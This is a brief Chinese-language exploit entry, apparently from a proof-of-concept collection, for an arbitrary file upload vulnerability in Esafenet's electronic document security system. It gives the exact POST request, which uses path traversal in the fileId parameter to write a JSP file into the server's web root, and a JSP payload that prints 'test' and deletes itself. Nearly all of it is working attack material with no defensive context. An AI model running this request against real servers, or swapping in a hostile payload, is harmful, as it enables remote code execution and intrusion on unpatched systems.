# 亿赛通电子文档安全管理系统DecryptApplicationService2任意文件上传漏洞

亿赛通电子文档安全管理系统DecryptApplicationService2 ｜ 文件上传 ｜ —
- **请求**：`POST /CDGServer3/DecryptApplicationService2?fileId=../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/test.jsp HTTP/1.1`

**Payload**
```
<%out.print("test");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
```
- **响应特征**：200